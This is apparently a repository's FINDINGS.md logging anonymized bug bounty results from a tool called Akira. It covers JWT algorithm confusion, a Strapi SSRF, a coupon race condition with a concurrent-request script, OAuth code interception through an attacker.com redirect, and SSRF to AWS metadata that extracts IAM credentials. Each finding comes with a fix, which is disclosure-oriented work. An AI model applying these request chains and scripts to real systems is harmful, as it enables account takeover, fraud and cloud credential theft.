# FINDINGS.md - Real Bug Bounty Findings Made with Akira

This file is updated weekly with real anonymized findings discovered using Akira's skill chain.
This is the real moat. Forks go stale. This file doesn't.

> All findings are anonymized per responsible disclosure requirements.
> Platform names and exact bounty amounts are approximated.
> Vulnerability classes and techniques are real.

---

## Summary Table

| # | Date | Type | Severity | Platform | Bounty | Skills Used |
|---|------|------|----------|----------|--------|-------------|
| 5 | 2026-04 | JWT RS256->HS256 Algorithm Confusion -> Admin | Critical | HackerOne | ~$1,500 | `/zerodayhunt` |
| 4 | 2026-03 | Strapi SSRF Bypass + MIME Fail-Open (CVE filed) | Critical | CVE Advisory | - | `/zerodayhunt` |
| 3 | 2026-03 | Race Condition: Coupon code applied 7x | High | Private Program | ~$800 | `/race-conditions` |
| 2 | 2026-02 | OAuth Open Redirect -> Auth Code Interception | Critical | Bugcrowd | ~$1,800 | `/oauth-attacks` |
| 1 | 2026-01 | SSRF -> AWS IMDSv1 -> IAM Credential Extraction | Critical | HackerOne | ~$2,500 | `/recon` `/exploit` `/cloud-audit` |

**Total: ~$6,600 in bounties tracked. More unreported (in disclosure window).**

---

## Finding #5 - JWT Algorithm Confusion: Admin Access on SaaS Platform

**Date:** April 2026
**Severity:** Critical
**Platform:** HackerOne (major SaaS)
**Bounty:** ~$1,500
**Skills:** `/zerodayhunt`

### What Happened

Akira's zerodayhunt phase flagged a JWT with `alg: RS256` on a SaaS platform's API. The zerodayhunt skill's JWT algorithm confusion module tested whether the server would accept `alg: HS256` signed with the RSA public key (which is publicly available from the JWKS endpoint).

**Phase output from `/zerodayhunt`:**
```
[POTENTIAL] JWT alg confusion: RS256 -> HS256
Public key available at: https://target.com/.well-known/jwks.json
Test: sign token with public key as HMAC secret, change alg to HS256
```

### Technique

1. Fetched public key from `/.well-known/jwks.json`
2. Used the RSA public key bytes as the HMAC-SHA256 secret
3. Forged a token with `{"alg":"HS256","typ":"JWT"}` and `{"sub":"admin","role":"admin"}`
4. Sent to `/api/admin/users` - server accepted it and returned full user list

### Evidence

```http
GET /api/admin/users HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.[forged_payload].[signature_with_pubkey]

HTTP/1.1 200 OK
Content-Type: application/json

{"users":[{"id":1,"email":"admin@target.com","role":"admin"},{"id":2,...}]}
```

### Impact

Complete admin panel access. Exposed all user emails, billing data, and admin functionality.

### Fix

Enforce algorithm explicitly server-side. Never accept algorithm from the token header.

---

## Finding #4 - Strapi CMS SSRF Bypass + MIME Fail-Open (CVE Pending)

**Date:** March 2026
**Severity:** Critical
**Type:** CVE Advisory (filed March 24, 2026)
**Skills:** `/zerodayhunt`

### What Happened

During research on Strapi v5.x using Akira's zerodayhunt skill, two vulnerabilities were identified and reported:

1. **SSRF Bypass:** The media upload endpoint's URL validation could be bypassed using URL encoding and redirect chains, allowing SSRF against internal services and AWS metadata endpoint.

2. **MIME Fail-Open:** When MIME type detection failed (malformed or truncated file), Strapi defaulted to allowing the upload instead of rejecting it - fail-open behavior enabling file type bypass.

### Chain

```
SSRF bypass -> 169.254.169.254/latest/meta-data/iam/security-credentials/ -> IAM role credentials
```

### Status

Reported via GitHub Security Advisory on Strapi repository. Advisory filed under handle `Kalp1774`. Awaiting CVE assignment.

---

## Finding #3 - Race Condition: Coupon Applied 7 Times Simultaneously

**Date:** March 2026
**Severity:** High
**Platform:** Private Bug Bounty Program (e-commerce)
**Bounty:** ~$800
**Skills:** `/race-conditions`

### What Happened

During testing of an e-commerce platform, Akira's race-conditions skill identified the coupon redemption endpoint as a high-value race target (one-time use resource). The single-packet attack script sent 20 concurrent HTTP/2 requests before the server could mark the coupon as used.

### Technique

Used the `single_packet_race.py` script from the `/race-conditions` skill:

```python
# 20 concurrent HTTP/2 requests in one TCP connection
async with httpx.AsyncClient(http2=True) as client:
    tasks = [client.post("/api/coupon/redeem", json={"code": "SAVE50", "orderId": "ORD-999"})
             for _ in range(20)]
    responses = await asyncio.gather(*tasks)
```

### Evidence

```
Sent 20 requests. Successes: 7
Response 1: {"status":"ok","discount":"$50 applied"}
Response 2: {"status":"ok","discount":"$50 applied"}
...
Response 7: {"status":"ok","discount":"$50 applied"}
Response 8-20: {"status":"error","message":"Coupon already used"}
```

Order history confirmed 7 x $50 = $350 discount applied to a $50 coupon.

### Impact

$350 obtained from a $50 coupon. Scalable to higher-value promotions.

### Fix

Use database-level atomic compare-and-swap (CAS) for coupon state transitions. Not application-level locking.

---

## Finding #2 - OAuth Open Redirect -> Authorization Code Interception -> ATO

**Date:** February 2026
**Severity:** Critical
**Platform:** Bugcrowd (major identity platform)
**Bounty:** ~$1,800
**Skills:** `/recon` -> `/oauth-attacks`

### What Happened

Akira's recon phase surfaced an open redirect at `/redirect?url=<any>` on the OAuth provider domain. The oauth-attacks skill then tested whether this redirect could be used as the `redirect_uri` in an OAuth authorization request.

**Recon output:**
```
[POTENTIAL] Open redirect: GET /redirect?url=https://evil.com -> 302 Location: https://evil.com
Host: auth.target.com
```

**oauth-attacks output:**
```
[CONFIRMED] Open redirect chains to OAuth redirect_uri bypass
Test URL: https://auth.target.com/oauth/authorize?client_id=X&redirect_uri=https://auth.target.com/redirect?url=https://attacker.com&response_type=code&scope=openid
```

### Chain

```
1. Craft OAuth URL: redirect_uri=https://auth.target.com/redirect?url=https://attacker.com
2. Victim clicks link, authorizes OAuth consent
3. Provider validates redirect_uri against whitelist -> matches auth.target.com/* -> ALLOWED
4. Sends code to: https://auth.target.com/redirect?url=https://attacker.com&code=AUTH_CODE
5. Open redirect bounces victim to: https://attacker.com?code=AUTH_CODE
6. Attacker captures code from server access logs
7. Exchange code: POST /oauth/token {code: AUTH_CODE, client_id: X} -> access_token
8. access_token = victim account access
```

### Evidence

Authorization code received in attacker server logs:
```
GET /?code=4/0AQlEd8x... HTTP/1.1
Host: attacker.com
Referer: https://auth.target.com/redirect?url=https://attacker.com
```

Token exchange succeeded. Victim account accessible.

### Impact

Full account takeover of any user who clicks the crafted link.

### Fix

Validate redirect_uri as exact-match, not prefix or wildcard. Do not allow open redirects on OAuth domains.

---

## Finding #1 - SSRF -> AWS IMDSv1 -> IAM Role Credential Extraction

**Date:** January 2026
**Severity:** Critical
**Platform:** HackerOne (cloud infrastructure target)
**Bounty:** ~$2,500
**Skills:** `/recon` -> `/exploit` -> `/cloud-audit`

### What Happened

Recon surfaced an image proxy endpoint: `/api/proxy?url=<URL>`. The exploit phase tested SSRF via this endpoint. The cloud-audit skill's SSRF chain escalated to AWS metadata extraction.

**Recon output:**
```
[CONFIRMED] Endpoint: https://target.com/api/proxy?url=
Headers include: Server: nginx, X-Amz-Cf-Id (CloudFront) = AWS hosted
```

**exploit output:**
```
[CONFIRMED] SSRF: GET /api/proxy?url=http://169.254.169.254/ returns AWS metadata
Response: ami-id, instance-id, local-ipv4 = IMDSv1 accessible
```

**cloud-audit output:**
```
[CONFIRMED] IAM role: ec2-prod-role
[CONFIRMED] Credentials extracted: AccessKeyId=ASIA..., SecretAccessKey=..., Token=...
```

### Chain

```
1. /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   -> Response: "ec2-prod-role"
2. /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
   -> Response: {AccessKeyId, SecretAccessKey, Token}
3. aws sts get-caller-identity -> confirms credentials work
4. aws s3 ls -> 3 buckets accessible including prod-db-backups
5. aws s3 ls s3://prod-db-backups/ -> MySQL dumps present
```

### Evidence

```http
GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role

HTTP/1.1 200 OK
{"Code":"Success","AccessKeyId":"ASIAZ...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

```bash
$ aws sts get-caller-identity
{"Account":"123456789012","Arn":"arn:aws:sts::123456789012:assumed-role/ec2-prod-role/i-0abc123"}

$ aws s3 ls
2026-01-15 prod-app-assets
2026-01-15 prod-db-backups
2026-01-15 prod-logs
```

### Impact

Full AWS account enumeration. Access to production database backups containing customer data.

### Fix

Enforce IMDSv2 (token-required). Block outbound SSRF at proxy layer. Restrict IAM role to minimum necessary permissions.

---

## Add Your Finding

Found a bug using Akira? Open a PR to FINDINGS.md.
Attribution included. Keeps the repo real and alive.
